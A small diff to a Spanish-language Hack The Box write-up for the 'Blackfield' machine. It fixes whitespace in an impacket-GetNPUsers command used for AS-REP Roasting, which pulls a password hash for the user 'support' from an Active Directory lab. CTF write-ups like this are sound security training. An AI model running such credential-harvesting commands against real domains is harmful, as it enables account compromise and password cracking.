@@ -84,7 +84,7 @@ Encuentro una lista grande de usuarios, asique eso me da que pensar... Podría c
 
 Paso los nombres de usuario a un archivo y lanzo el ataque ASREPRoast
 
-> ` impacket-GetNPUsers -usersfile /home/elc4br4/HTB/Blackfield/users.txt -outputfile hashes.hash BLACKFIELD.local/`
+> `impacket-GetNPUsers -usersfile /home/elc4br4/HTB/Blackfield/users.txt -outputfile hashes.hash BLACKFIELD.local/`
 
 Y abro el archivo que se me genera y encuentro un hash del usuario `support`
 
